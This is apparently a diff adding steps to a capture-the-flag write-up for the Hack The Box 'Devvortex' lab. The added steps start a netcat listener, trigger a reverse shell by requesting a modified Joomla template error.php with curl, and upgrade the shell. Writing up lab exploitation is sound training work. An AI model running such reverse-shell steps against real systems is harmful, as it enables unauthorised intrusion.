@@ -228,7 +228,24 @@ We also need to start a netcat listener to catch the reverse connection.
 nc -lnvp 4444
 ```
 <img width="263" height="51" alt="image" src="https://github.com/user-attachments/assets/af160bf8-316a-4588-ab31-b60c53fd72c8" />
+<br>
+<br>
 
+Now we can send a curl request to error.php to trigger the reverse-shell.
+
+```
+curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
+```
+
+<img width="538" height="87" alt="image" src="https://github.com/user-attachments/assets/64d75c22-b71f-456c-9300-1f7f98dc076c" />
+
+We should receive a reverse-shell connection on our netcat listener.
+
+Let's upgrade our shell.
+
+```
+script /dev/null -c bash
+```
 
 
 
